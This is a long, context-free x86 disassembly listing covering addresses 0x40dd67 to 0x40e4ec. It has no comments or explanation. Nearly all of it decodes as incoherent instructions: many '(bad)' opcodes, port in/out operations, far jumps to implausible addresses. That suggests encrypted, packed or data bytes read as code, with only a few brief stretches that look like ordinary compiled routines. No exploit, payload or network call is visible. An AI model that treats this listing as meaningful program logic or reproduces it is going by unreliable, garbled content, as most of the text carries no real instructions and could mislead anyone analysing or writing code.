  40dd67:	shr    DWORD PTR [eax+edi*2+0x787e3578],cl
  40dd6e:	js     0x40dd3b
  40dd70:	mov    ecx,0x8941954
  40dd75:	es push 0x5f036a71
  40dd7b:	add    DWORD PTR [esi-0x67ddc1d9],0xe
  40dd82:	mov    edx,eax
  40dd84:	pop    eax
  40dd85:	jmp    0x40dd16
  40dd87:	int3   
  40dd88:	pop    ds
  40dd89:	dec    ebp
  40dd8a:	push   edx
  40dd8b:	cdq    
  40dd8c:	loopne 0x40dda5
  40dd8e:	pop    ss
  40dd8f:	daa    
  40dd90:	mov    esi,0xadc3327a
  40dd95:	data16 shr al,1
  40dd98:	retf   0xaad5
  40dd9b:	inc    ebp
  40dd9c:	clc    
  40dd9d:	retf   
  40dd9e:	pop    ebx
  40dd9f:	add    dl,0xfb
  40dda2:	std    
  40dda3:	jmp    0xadc71e86
  40dda8:	fwait
  40dda9:	cwde   
  40ddaa:	mov    bl,0xea
  40ddac:	pop    esp
  40ddad:	lahf   
  40ddae:	jmp    edi
  40ddb0:	or     eax,0xc6d96ea5
  40ddb5:	jne    0x40dd3f
  40ddb7:	dec    ebx
  40ddb8:	lahf   
  40ddb9:	cwde   
  40ddba:	stos   BYTE PTR es:[edi],al
  40ddbb:	pop    esp
  40ddbc:	dec    edi
  40ddbd:	dec    esi
  40ddbe:	sub    bl,cl
  40ddc0:	jmp    DWORD PTR [ebp-0x642ef3af]
  40ddc6:	xlat   BYTE PTR ds:[ebx]
  40ddc7:	imul   eax,DWORD PTR ds:0x7ecefdcc,0xf9fc33d5
  40ddd1:	inc    ecx
  40ddd2:	or     ecx,ebp
  40ddd4:	dec    edx
  40ddd5:	(bad)  
  40ddd6:	shr    al,cl
  40ddd8:	leave  
  40ddd9:	pop    ecx
  40ddda:	add    edx,ebx
  40dddc:	inc    edx
  40dddd:	call   0xa310a3dc
  40dde2:	shl    DWORD PTR [ebx+0x13e1db0],cl
  40dde8:	adc    bl,ch
  40ddea:	push   ebp
  40ddeb:	mov    eax,ds:0x7e0d1b20
  40ddf0:	dec    eax
  40ddf1:	mov    dl,0x2b
  40ddf3:	push   esp
  40ddf4:	in     al,0xd7
  40ddf6:	aam    0xfb
  40ddf8:	arpl   WORD PTR [esi-0x35],bx
  40ddfb:	xchg   ebx,eax
  40ddfc:	fcmovnb st,st(5)
  40ddfe:	xor    al,0xd8
  40de00:	in     eax,dx
  40de01:	mov    esp,0x94e354e8
  40de06:	iret   
  40de07:	test   dl,ah
  40de09:	ret    
  40de0a:	leave  
  40de0b:	pop    ss
  40de0c:	(bad)  
  40de0d:	adc    edx,ebp
  40de0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de10:	xor    DWORD PTR [ebp-0x61740ec3],edx
  40de16:	enter  0xb403,0xd5
  40de1a:	leave  
  40de1b:	bound  edi,QWORD PTR [ecx]
  40de1d:	cmc    
  40de1e:	jb     0x40de4f
  40de20:	mov    ds:0x3c73962d,eax
  40de25:	sub    BYTE PTR [edi+0x24],ah
  40de28:	ss push edi
  40de2a:	or     ebx,DWORD PTR [ecx-0x2ac14b5a]
  40de30:	in     al,0x4f
  40de32:	dec    edi
  40de33:	ds xor ebx,ebx
  40de36:	mov    ah,bl
  40de38:	inc    ebx
  40de39:	adc    al,0xf1
  40de3b:	aaa    
  40de3c:	idiv   edi
  40de3e:	add    dh,BYTE PTR ds:[edi*4-0x5a520e72]
  40de46:	out    dx,al
  40de47:	push   esi
  40de48:	out    dx,eax
  40de49:	xchg   edi,eax
  40de4a:	inc    eax
  40de4b:	jg     0x40de6b
  40de4d:	lock loope 0x40dea8
  40de50:	jmp    FWORD PTR [ebp-0x77]
  40de53:	cwde   
  40de54:	inc    eax
  40de55:	pop    ebx
  40de56:	icebp  
  40de57:	push   edi
  40de58:	out    0x5a,al
  40de5a:	push   cs
  40de5b:	out    0x41,eax
  40de5d:	jle    0x40de1f
  40de5f:	xor    al,0x41
  40de61:	sub    esi,DWORD PTR [edx-0xa]
  40de64:	sub    al,dh
  40de66:	aam    0x27
  40de68:	jp     0x40de2b
  40de6a:	imul   edx,DWORD PTR [ecx-0x48497989],0x7ebce14e
  40de74:	cmp    al,0x4c
  40de76:	xlat   BYTE PTR ds:[ebx]
  40de77:	pop    edx
  40de78:	or     dl,ch
  40de7a:	scas   eax,DWORD PTR es:[edi]
  40de7b:	mov    bl,0x9b
  40de7d:	ins    BYTE PTR es:[edi],dx
  40de7e:	repz sub al,0x83
  40de81:	hlt    
  40de82:	and    ecx,DWORD PTR [esi]
  40de84:	(bad)  
  40de85:	dec    ecx
  40de86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de87:	jae    0x40de9e
  40de89:	sbb    BYTE PTR [edx-0x2e697bf7],dh
  40de8f:	test   eax,0x729fe621
  40de94:	shr    BYTE PTR [edi+0x7a42783e],1
  40de9a:	mov    al,ds:0x9d1c8832
  40de9f:	scas   al,BYTE PTR es:[edi]
  40dea0:	mov    cl,0xd8
  40dea2:	aam    0x30
  40dea4:	cld    
  40dea5:	dec    esi
  40dea6:	mov    ebx,0x64488e99
  40deab:	in     al,dx
  40deac:	xor    eax,edx
  40deae:	dec    edx
  40deaf:	je     0x40df20
  40deb1:	gs bnd jmp 0x869926e1
  40deb8:	adc    DWORD PTR [ebx+esi*8+0x1fa1a556],eax
  40debf:	popa   
  40dec0:	jb     0x40de83
  40dec2:	mov    eax,ds:0xbb8ea3b0
  40dec7:	mov    eax,0xffb55b8e
  40decc:	cdq    
  40decd:	out    0x37,eax
  40decf:	and    BYTE PTR [esi-0x8f95d8b],cl
  40ded5:	xor    BYTE PTR [esi+0x1],bl
  40ded8:	xchg   BYTE PTR [eax+0x1b],ah
  40dedb:	sub    eax,0xe625a295
  40dee0:	inc    ebp
  40dee1:	sub    BYTE PTR [eax-0x47],ch
  40dee4:	xor    DWORD PTR [ecx-0x228393fc],0x5ddb4a5
  40deee:	(bad)  
  40deef:	es enter 0x4e69,0xf
  40def4:	clc    
  40def5:	adc    al,0xb9
  40def7:	outs   dx,DWORD PTR ds:[esi]
  40def8:	add    BYTE PTR [edx-0x7b],bh
  40defb:	sub    al,0xee
  40defd:	cmp    ebp,0xe6eb9ace
  40df03:	pusha  
  40df04:	add    DWORD PTR [edx-0x47fc9261],eax
  40df0a:	scas   eax,DWORD PTR es:[edi]
  40df0b:	jns    0x40df7f
  40df0d:	add    edi,DWORD PTR [ebx+0x32289fb7]
  40df13:	xchg   ebx,eax
  40df14:	cmp    DWORD PTR ds:0x86ec7520,edi
  40df1a:	jb     0x40debd
  40df1c:	iret   
  40df1d:	cmp    eax,0xd2f8089c
  40df22:	push   edx
  40df23:	xchg   esi,eax
  40df24:	xor    bh,BYTE PTR [ebp+0x35]
  40df27:	and    eax,0xd13b573d
  40df2c:	dec    ecx
  40df2d:	pop    ds
  40df2e:	jl     0x40df21
  40df30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df31:	fdiv   QWORD PTR [eax+0x78]
  40df34:	pop    es
  40df35:	scas   al,BYTE PTR es:[edi]
  40df36:	adc    dl,BYTE PTR [esi+0x54]
  40df39:	out    dx,al
  40df3a:	(bad)  
  40df3b:	or     eax,0xa90b8a32
  40df40:	in     al,0x23
  40df42:	and    BYTE PTR [ebp+0xb91050d],dh
  40df48:	mov    edx,0x12452261
  40df4d:	dec    esp
  40df4e:	fnstcw WORD PTR [edi+0x15]
  40df51:	popf   
  40df52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df53:	mov    dl,0x5c
  40df55:	outs   dx,DWORD PTR ds:[esi]
  40df56:	xchg   ebx,eax
  40df57:	xor    ebx,ecx
  40df59:	jb     0x40def3
  40df5b:	paddq  mm3,QWORD PTR [edx+0x70]
  40df5f:	cmp    dl,al
  40df61:	cmc    
  40df62:	xchg   ebp,eax
  40df63:	lahf   
  40df64:	sbb    eax,0x846466fd
  40df69:	mov    eax,0xa5babb60
  40df6e:	xchg   edi,eax
  40df6f:	xor    ah,dl
  40df71:	lods   al,BYTE PTR ds:[esi]
  40df72:	push   ebx
  40df73:	adc    eax,0xa1691746
  40df78:	pop    DWORD PTR [edx-0xf9d279f]
  40df7e:	in     eax,dx
  40df7f:	es test al,0x75
  40df82:	sar    BYTE PTR [esi+ebx*4+0x40636f71],1
  40df89:	(bad)  
  40df8a:	pop    ss
  40df8b:	add    ebp,ebx
  40df8d:	imul   edi,DWORD PTR [edi-0xfb79379],0x70
  40df94:	dec    BYTE PTR [edi]
  40df96:	pop    esp
  40df97:	lock xchg ebp,eax
  40df99:	pop    es
  40df9a:	test   al,0x3
  40df9c:	popf   
  40df9d:	(bad)  
  40df9e:	test   eax,0xf7b8173e
  40dfa3:	mov    es,WORD PTR ds:0xb2879a4
  40dfa9:	add    BYTE PTR [ebx],0xc3
  40dfac:	mov    DWORD PTR [ebp-0x54],eax
  40dfaf:	not    DWORD PTR ds:0x42a839
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx-0x21bfbec6],1
  40dfde:	mov    bl,0xe4
  40dfe0:	push   ds
  40dfe1:	mov    BYTE PTR [edx+0x7e357878],dh
  40dfe7:	js     0x40e061
  40dfe9:	xchg   edx,eax
  40dfea:	lods   eax,DWORD PTR ds:[esi]
  40dfeb:	fsub   DWORD PTR [ecx-0x70891c9f]
  40dff1:	xchg   esp,eax
  40dff2:	pusha  
  40dff3:	sub    ah,BYTE PTR [eax-0x23ae50a8]
  40dff9:	ffreep st(2)
  40dffb:	mov    al,0x8a
  40dffd:	js     0x40dfbf
  40dfff:	adc    DWORD PTR [ebp+ebx*1-0x51c6ae8e],ebp
  40e006:	mov    dl,0xb7
  40e008:	adc    dh,BYTE PTR [eax+0x26]
  40e00b:	dec    eax
  40e00c:	stos   BYTE PTR es:[edi],al
  40e00d:	retf   
  40e00e:	and    bh,cl
  40e010:	test   eax,edx
  40e012:	shr    DWORD PTR [ecx],1
  40e014:	add    BYTE PTR es:[esi+0x36],ah
  40e018:	das    
  40e019:	retf   0x806a
  40e01c:	pop    esp
  40e01d:	inc    esp
  40e01e:	cmp    DWORD PTR [esi],esp
  40e020:	test   al,0xb7
  40e022:	sbb    al,0xcc
  40e024:	sbb    al,0x8
  40e026:	pop    ebp
  40e027:	xchg   BYTE PTR fs:[ecx+0x403b790d],ah
  40e02e:	gs out 0xa7,eax
  40e031:	sbb    al,0xf
  40e033:	xor    edx,DWORD PTR [esi+ebp*1-0x660ad3a7]
  40e03a:	ror    esi,1
  40e03c:	(bad)  
  40e03d:	or     eax,0x6df6565c
  40e042:	popa   
  40e043:	test   BYTE PTR [edx+0x3e],ch
  40e046:	sahf   
  40e047:	in     eax,0x23
  40e049:	ds mov eax,0xab916818
  40e04f:	aaa    
  40e050:	in     al,0xf7
  40e052:	mov    dl,0x99
  40e054:	enter  0x243e,0xd1
  40e058:	aaa    
  40e059:	out    0x10,eax
  40e05b:	(bad)  
  40e05c:	jp     0x40e02a
  40e05e:	jne    0x40e040
  40e060:	add    DWORD PTR [eax+0xe],0xffffffaf
  40e064:	inc    edi
  40e065:	out    dx,al
  40e066:	js     0x40e026
  40e068:	stos   BYTE PTR es:[edi],al
  40e069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e06a:	jp     0x40e071
  40e06c:	stc    
  40e06d:	ffree  st(6)
  40e06f:	push   0xd046c10a
  40e074:	or     al,0xc8
  40e076:	mov    cl,0x9e
  40e078:	idiv   BYTE PTR [edx+0x43]
  40e07b:	mov    bh,0x53
  40e07d:	(bad)  
  40e07e:	rcr    DWORD PTR [edx],cl
  40e080:	inc    ecx
  40e081:	pop    ebx
  40e082:	add    al,0xf6
  40e084:	xchg   DWORD PTR [ecx],eax
  40e086:	cmp    al,0xd3
  40e088:	ficomp WORD PTR [eax+0x48]
  40e08b:	push   0xe474d238
  40e090:	or     edx,0xffffff93
  40e093:	out    dx,al
  40e094:	adc    ah,al
  40e096:	jge    0x40e08f
  40e098:	popf   
  40e099:	adc    eax,0xc98d000d
  40e09e:	jp     0x40e06b
  40e0a0:	fcomp  QWORD PTR [eax+0x39]
  40e0a3:	dec    ecx
  40e0a4:	mov    eax,0x92c6ae32
  40e0a9:	dec    esi
  40e0aa:	inc    edx
  40e0ab:	mov    edx,0xb0cf1723
  40e0b1:	imul   esi,DWORD PTR [edx+0x5c],0xeec2d4c5
  40e0b8:	ja     0x40e11a
  40e0ba:	mov    bl,cl
  40e0bc:	mov    eax,0x5b2a349
  40e0c1:	rol    DWORD PTR [esi-0x6c],1
  40e0c4:	jmp    0xe69f:0x721d0ca4
  40e0cb:	dec    edi
  40e0cc:	jecxz  0x40e069
  40e0ce:	and    edi,DWORD PTR [ebx]
  40e0d0:	clc    
  40e0d1:	pop    ss
  40e0d2:	popf   
  40e0d3:	add    bl,BYTE PTR [edi-0x355f9f5a]
  40e0d9:	ret    0x8c3e
  40e0dc:	sti    
  40e0dd:	pushf  
  40e0de:	add    eax,0x496f2d21
  40e0e3:	pop    ecx
  40e0e4:	xchg   ecx,eax
  40e0e5:	or     ch,BYTE PTR [ecx]
  40e0e7:	fstp   QWORD PTR [ebp-0x11]
  40e0ea:	lds    eax,FWORD PTR [edi]
  40e0ec:	jmp    0xd4e824de
  40e0f1:	add    dl,BYTE PTR [eax+ebx*4-0x50]
  40e0f5:	push   ecx
  40e0f6:	(bad)
  40e0f9:	mov    al,ds:0x45c2f21f
  40e0fe:	xchg   ecx,eax
  40e0ff:	bound  edi,QWORD PTR [ebx+0x43]
  40e102:	mov    ah,0x55
  40e104:	xor    eax,0x56298681
  40e109:	das    
  40e10a:	ror    BYTE PTR [ebx+eax*1],0xea
  40e10e:	sti    
  40e10f:	data16 lahf 
  40e111:	inc    edi
  40e112:	sub    al,0x68
  40e115:	or     al,0x40
  40e117:	jl     0x40e12e
  40e119:	mov    ds:0xc87dc378,al
  40e11e:	inc    ebp
  40e11f:	sub    cl,BYTE PTR [ebx]
  40e121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e122:	lods   eax,DWORD PTR ds:[esi]
  40e123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e124:	mov    ebp,0x5f19b95
  40e129:	mov    dl,0x27
  40e12b:	iret   
  40e12c:	add    esp,DWORD PTR [edx-0x4c27a402]
  40e132:	in     al,0xea
  40e134:	call   0x32dc:0x3bacaa3
  40e13b:	loopne 0x40e14f
  40e13d:	les    ecx,FWORD PTR [edx]
  40e13f:	or     al,0xc
  40e141:	cmpxchg DWORD PTR [ebx+0x477a90cc],edx
  40e148:	test   eax,0x670652c9
  40e14d:	outs   dx,DWORD PTR ds:[esi]
  40e14e:	sub    BYTE PTR [eax+0x5728900a],bh
  40e154:	aaa    
  40e155:	push   esi
  40e156:	test   bl,ch
  40e158:	xlat   BYTE PTR ds:[ebx]
  40e159:	push   ds
  40e15a:	sub    eax,0xe52045ed
  40e15f:	cmp    edi,DWORD PTR [ecx-0x5]
  40e162:	adc    al,0x77
  40e164:	pop    esp
  40e165:	es inc eax
  40e167:	shl    esp,cl
  40e169:	mov    ecx,0x8b3c3b22
  40e16e:	pop    edx
  40e16f:	xor    eax,0x727750af
  40e174:	shl    DWORD PTR [ebx+eiz*2+0x4e7f681],1
  40e17b:	imul   edi,DWORD PTR [edi-0x53],0x3b3aa2b8
  40e182:	cmc    
  40e183:	nop
  40e184:	xor    al,0xa6
  40e186:	and    cl,BYTE PTR [edi]
  40e188:	in     al,dx
  40e189:	pop    edx
  40e18a:	pushf  
  40e18b:	or     DWORD PTR [edx+0x6402999c],0x6d
  40e192:	mov    edi,ss
  40e194:	add    DWORD PTR [ebp-0x6bd011cd],0xe5da6c4
  40e19e:	sub    bl,bl
  40e1a0:	inc    esi
  40e1a1:	fdiv   QWORD PTR [ebx-0x3d]
  40e1a4:	push   eax
  40e1a5:	jmp    0xedac5397
  40e1aa:	cmp    eax,0xa09e3f96
  40e1af:	push   esp
  40e1b0:	xchg   dh,bh
  40e1b2:	sti    
  40e1b3:	lds    edx,FWORD PTR [esi-0x27a487de]
  40e1b9:	add    DWORD PTR [ebx-0x4e],edi
  40e1bc:	or     ch,BYTE PTR [ecx+0x20e62595]
  40e1c2:	sbb    edi,DWORD PTR [esi-0x67c9cf0a]
  40e1c8:	nop
  40e1c9:	mov    ch,0xbd
  40e1cb:	out    0x75,eax
  40e1cd:	pop    ecx
  40e1ce:	cmp    eax,0x8c0ee15f
  40e1d3:	xchg   BYTE PTR [edi+0x1f85772b],dh
  40e1d9:	stos   BYTE PTR es:[edi],al
  40e1da:	lods   al,BYTE PTR ds:[esi]
  40e1db:	inc    ebp
  40e1dc:	ds push cs
  40e1de:	cld    
  40e1df:	inc    eax
  40e1e0:	clc    
  40e1e1:	outs   dx,BYTE PTR ds:[esi]
  40e1e2:	mov    gs,WORD PTR cs:[edi+esi*4+0x317a20eb]
  40e1ea:	bound  esi,QWORD PTR [esi+0x50]
  40e1ed:	in     al,0xdb
  40e1ef:	sahf   
  40e1f0:	dec    esp
  40e1f1:	inc    edx
  40e1f2:	test   BYTE PTR [edi-0x3e],0xcc
  40e1f6:	retf   
  40e1f7:	add    bl,BYTE PTR [esi-0x78]
  40e1fa:	xchg   bh,dh
  40e1fc:	pop    ss
  40e1fd:	jecxz  0x40e1bb
  40e1ff:	aam    0x18
  40e201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e202:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e203:	mov    ah,0x93
  40e205:	(bad)  
  40e206:	(bad)  
  40e207:	mov    ds:0xb48eebb5,al
  40e20c:	or     al,0xa7
  40e20e:	ret    
  40e20f:	retf   
  40e210:	sub    esp,DWORD PTR [edi-0x7f7c839c]
  40e216:	jnp    0x40e283
  40e218:	inc    ecx
  40e219:	cmp    ebx,DWORD PTR [edi-0x1a]
  40e21c:	pop    edi
  40e21d:	push   0x1d
  40e21f:	nop
  40e220:	xchg   DWORD PTR [ebp+0x17],ecx
  40e223:	sub    al,0x33
  40e225:	mov    BYTE PTR [ebx],0xc3
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	inc    eax
  40e23b:	adc    ch,dh
  40e23d:	mov    WORD PTR [ebp-0x50],es
  40e240:	js     0x40e2ba
  40e242:	xor    eax,0xbf78787e
  40e247:	cli    
  40e248:	adc    BYTE PTR [ebp-0x6e],cl
  40e24b:	add    eax,0x7cbf4a24
  40e250:	loop   0x40e245
  40e252:	sub    eax,0xd0e3a0c6
  40e257:	add    BYTE PTR es:[ebp-0x10],ch
  40e25b:	(bad)  
  40e25c:	pop    edx
  40e25d:	iret   
  40e25e:	lock fneni(8087 only) 
  40e261:	call   0xb3233d71
  40e266:	push   edi
  40e267:	cwde   
  40e268:	sub    DWORD PTR [edi+0x2f],ebp
  40e26b:	dec    eax
  40e26c:	inc    ecx
  40e26d:	and    DWORD PTR [ebx],edx
  40e26f:	loop   0x40e27e
  40e271:	(bad)  
  40e272:	xchg   ebx,eax
  40e273:	jmp    0x40e224
  40e275:	xchg   esp,eax
  40e276:	scas   al,BYTE PTR es:[edi]
  40e277:	xor    DWORD PTR [ecx+0x2a],eax
  40e27a:	xor    esp,edx
  40e27c:	aad    0xad
  40e27e:	mov    bh,BYTE PTR ds:0x4301258a
  40e284:	dec    ebp
  40e285:	out    dx,al
  40e286:	aaa    
  40e287:	inc    ebx
  40e288:	mul    DWORD PTR [edx+0x63]
  40e28b:	daa    
  40e28c:	mov    bl,0x74
  40e28e:	add    BYTE PTR [esi-0xb4cb4f6],ah
  40e294:	je     0x40e2e9
  40e296:	cli    
  40e297:	add    DWORD PTR ds:0x966d13d5,0x3b
  40e29e:	retf   
  40e29f:	ss cli 
  40e2a1:	jmp    0x82286814
  40e2a6:	push   ebp
  40e2a7:	jns    0x40e27f
  40e2a9:	aam    0xb7
  40e2ab:	sub    eax,0xadde73be
  40e2b0:	nop
  40e2b1:	pop    edi
  40e2b2:	jge    0x40e2ca
  40e2b4:	sbb    bh,BYTE PTR [ebp+0x4e]
  40e2b7:	mov    DWORD PTR [esi-0x49e22e37],ebp
  40e2bd:	test   DWORD PTR [ebp-0x30],esi
  40e2c0:	lahf   
  40e2c1:	sti    
  40e2c2:	fsub   QWORD PTR ds:0xc4f88b22
  40e2c8:	mov    ebp,0x8f3a7511
  40e2cd:	adc    eax,0x37672cb0
  40e2d2:	mov    ah,0xe0
  40e2d4:	pop    ss
  40e2d5:	mov    BYTE PTR [edi],dl
  40e2d7:	inc    edx
  40e2d8:	stos   BYTE PTR es:[edi],al
  40e2d9:	popf   
  40e2da:	push   esp
  40e2db:	cmp    esp,DWORD PTR [edi+0x50]
  40e2de:	inc    ebx
  40e2df:	hlt    
  40e2e0:	dec    edi
  40e2e1:	mov    ebx,0x2d34acf3
  40e2e6:	(bad)  
  40e2e7:	mov    bh,0x54
  40e2e9:	dec    edx
  40e2ea:	adc    ch,BYTE PTR [edx-0x533be734]
  40e2f0:	cli    
  40e2f1:	xor    al,0xf8
  40e2f3:	and    eax,DWORD PTR [ecx+0x4]
  40e2f6:	adc    al,0x39
  40e2f8:	inc    al
  40e2fa:	outs   dx,DWORD PTR ds:[esi]
  40e2fb:	adc    BYTE PTR [ebx+0xf321cbc],bl
  40e301:	addr16 add edi,esi
  40e304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e305:	mov    edx,edi
  40e307:	dec    edx
  40e308:	cmp    ebx,DWORD PTR [ebx-0x1d]
  40e30b:	pushf  
  40e30c:	ins    DWORD PTR es:[edi],dx
  40e30d:	(bad)  
  40e30e:	ret    0xd7bb
  40e311:	imul   edx,DWORD PTR [eax],0x9f8a016
  40e317:	lds    edi,FWORD PTR [bx+si]
  40e31a:	xor    eax,0xdd47da23
  40e31f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e321:	rcl    BYTE PTR ds:0x7a26e7e7,0xea
  40e328:	inc    esi
  40e329:	loope  0x40e36d
  40e32b:	cli    
  40e32c:	jae    0x40e2d0
  40e32e:	jge    0x40e326
  40e330:	pop    ss
  40e331:	mov    eax,es
  40e333:	jle    0x40e342
  40e335:	jmp    0x40e388
  40e337:	dec    edx
  40e338:	fld    TBYTE PTR [esi+0x2c]
  40e33b:	jmp    0x2b5bbae9
  40e340:	xor    BYTE PTR [eax-0x751886f1],dh
  40e346:	mov    dl,0x7a
  40e348:	repnz or ch,BYTE PTR [ecx]
  40e34b:	cdq    
  40e34c:	xchg   edi,eax
  40e34d:	push   ebx
  40e34e:	pop    esi
  40e34f:	push   ss
  40e350:	or     BYTE PTR [esp+eax*4],ch
  40e353:	cs inc eax
  40e355:	icebp  
  40e356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e357:	mov    edi,DWORD PTR [edi+0x51]
  40e35a:	pop    ds
  40e35b:	(bad)  
  40e35e:	in     al,dx
  40e35f:	test   DWORD PTR [edx],0x5da55ae4
  40e365:	mov    edx,DWORD PTR [ebp+esi*8+0x51]
  40e369:	dec    ebx
  40e36a:	cmp    DWORD PTR [edx-0x9],esi
  40e36d:	pop    esp
  40e36e:	and    BYTE PTR [ebp+0x4c],0x4b
  40e372:	jle    0x40e360
  40e374:	sbb    DWORD PTR [ecx+0x6c4ea604],eax
  40e37a:	sub    eax,0xb101f0f
  40e37f:	sub    DWORD PTR [edi-0x16],0xe7d322be
  40e386:	adc    DWORD PTR [edx-0x5a725d55],edx
  40e38c:	std    
  40e38d:	test   ah,cl
  40e38f:	sub    eax,0xaf9cbf9b
  40e394:	and    bh,BYTE PTR ds:0x679ffc0
  40e39a:	mov    eax,0x3d8e9572
  40e39f:	mov    cl,0x15
  40e3a1:	aas    
  40e3a2:	push   ebp
  40e3a3:	jb     0x40e3f1
  40e3a5:	mov    al,ds:0x6015c27f
  40e3aa:	imul   edi,DWORD PTR [edi],0xdd4741a2
  40e3b0:	xchg   ebp,eax
  40e3b1:	push   ecx
  40e3b2:	jne    0x40e41a
  40e3b4:	outs   dx,BYTE PTR ds:[esi]
  40e3b5:	data16 mov al,ds:0xb59eb08b
  40e3bb:	cmp    al,0x93
  40e3bd:	or     al,0x57
  40e3bf:	inc    edx
  40e3c0:	pop    es
  40e3c1:	(bad)  
  40e3c2:	mov    dh,0x4f
  40e3c4:	jle    0x40e358
  40e3c6:	lods   al,BYTE PTR ds:[esi]
  40e3c7:	inc    ebx
  40e3c8:	dec    esi
  40e3c9:	pop    ebp
  40e3ca:	ret    
  40e3cb:	xor    DWORD PTR [esi-0x3a44747b],edi
  40e3d1:	fist   WORD PTR [ebp-0x228cf366]
  40e3d7:	rol    cl,0x77
  40e3da:	sbb    al,0xef
  40e3dc:	shl    DWORD PTR [ebp+0x5],cl
  40e3df:	pop    ss
  40e3e0:	mov    cl,0xed
  40e3e2:	aaa    
  40e3e3:	pushf  
  40e3e4:	jg     0x40e37e
  40e3e6:	mov    edx,0xbebf3c08
  40e3eb:	sti    
  40e3ec:	sbb    edx,edx
  40e3ee:	push   cs
  40e3ef:	xor    ah,ah
  40e3f1:	jl     0x40e3b2
  40e3f3:	push   0xf
  40e3f5:	retf   
  40e3f6:	lods   eax,DWORD PTR ds:[esi]
  40e3f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3f8:	lods   al,BYTE PTR ds:[esi]
  40e3f9:	mov    gs:0x8a217635,al
  40e3ff:	test   BYTE PTR [esi-0x27e3e725],bl
  40e405:	int    0xb1
  40e407:	jp     0x40e395
  40e409:	inc    eax
  40e40a:	or     eax,0xa41f61b4
  40e40f:	sub    BYTE PTR [edi],ah
  40e411:	sbb    ebp,eax
  40e413:	dec    esp
  40e414:	xchg   esp,eax
  40e415:	add    BYTE PTR [esi],cl
  40e417:	xchg   edi,eax
  40e418:	mov    esi,0xa342f7b2
  40e41d:	cdq    
  40e41e:	dec    eax
  40e41f:	jae    0x40e3f4
  40e421:	repz sbb esi,DWORD PTR [eax-0x65]
  40e425:	dec    ebx
  40e426:	xlat   BYTE PTR ds:[ebx]
  40e427:	dec    esp
  40e428:	fsub   QWORD PTR [ebx]
  40e42a:	fcom   QWORD PTR [ecx-0x39]
  40e42d:	add    al,0xc7
  40e42f:	push   edx
  40e430:	mov    ah,0xd7
  40e432:	or     bh,BYTE PTR [edx]
  40e434:	xchg   ebp,eax
  40e435:	shld   DWORD PTR [edx],esp,cl
  40e438:	push   0xffffffba
  40e43a:	es ret 0xf24e
  40e43e:	xor    BYTE PTR [ecx-0x2937c6b3],dl
  40e444:	popa   
  40e445:	xchg   edx,eax
  40e446:	push   esp
  40e447:	or     al,0xa6
  40e449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e44a:	(bad)  
  40e44b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e44c:	lock cld 
  40e44e:	push   0xa7eab470
  40e453:	inc    ecx
  40e454:	in     eax,0x51
  40e456:	push   cs
  40e457:	inc    ebp
  40e458:	retf   
  40e459:	pop    ebx
  40e45a:	or     al,0x55
  40e45c:	in     al,0x60
  40e45e:	xchg   esi,eax
  40e45f:	in     al,0x39
  40e461:	push   esp
  40e462:	mov    esi,0xced30fb8
  40e467:	mov    DWORD PTR [ebx+0x211f407d],eax
  40e46d:	cmp    esp,ecx
  40e46f:	mov    dl,0x24
  40e471:	imul   esp,DWORD PTR [edx-0x7c],0x49f7be0a
  40e478:	cs mov ah,0x17
  40e47b:	gs dec edx
  40e47d:	or     DWORD PTR [ecx+ebp*4],eax
  40e480:	sbb    ah,BYTE PTR [ecx+0x41eb06]
  40e486:	push   0x41ea5c
  40e48b:	push   DWORD PTR [eax]
  40e48d:	call   0x419198
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    ebp,ecx
  40e4b8:	mov    eax,0xb502ff04
  40e4bd:	js     0x40e537
  40e4bf:	xor    eax,0xd178787e
  40e4c4:	jb     0x40e504
  40e4c6:	xor    ch,BYTE PTR [edx+edi*8]
  40e4c9:	push   edi
  40e4ca:	pop    ds
  40e4cb:	push   0xb278a0a
  40e4d0:	pop    es
  40e4d1:	in     eax,dx
  40e4d2:	push   0x5c
  40e4d4:	mov    edi,0xee527641
  40e4d9:	outs   dx,BYTE PTR ds:[esi]
  40e4da:	gs std 
  40e4dc:	ficomp WORD PTR [edx-0x57ccf652]
  40e4e2:	push   es
  40e4e3:	cwde   
  40e4e4:	cmp    DWORD PTR [ebx-0x50b2cfef],ebp
  40e4ea:	jnp    0x40e527
  40e4ec:	cdq    
